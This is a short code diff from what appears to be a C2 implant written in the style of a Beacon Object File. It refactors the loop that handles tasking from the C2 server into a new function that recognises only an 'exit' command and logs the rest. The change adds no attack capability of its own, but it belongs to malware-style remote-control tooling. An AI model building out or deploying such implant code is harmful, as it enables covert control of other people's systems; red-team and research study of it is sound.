@@ -78,6 +78,15 @@ void perform_tasking(AgentParams *params, TaskingReply *reply, HttpHandle *http)
 	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
 }
 
+void process_task(TaskInfo *task) {
+	if (MSVCRT$strcmp(task->command, "exit") == 0) {
+		dprintf("Received exit command.");
+		return;
+	}
+	
+	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
+}
+
 void go() {
 	HttpHandle *http;
 	AgentParams params = { 0 };
@@ -106,7 +115,7 @@ void go() {
 		
 		dprintf("Received tasking from C2 server!");
 		for (int i = 0; i < tasking_reply.tasking_size; i++) {
-			dprintf("COMMAND %s: %s %s", tasking_reply.tasks[i].id, tasking_reply.tasks[i].command, tasking_reply.tasks[i].parameters);
+			process_task(&tasking_reply.tasks[i]);
 		}
 		
 		free_tasking_reply(&tasking_reply);
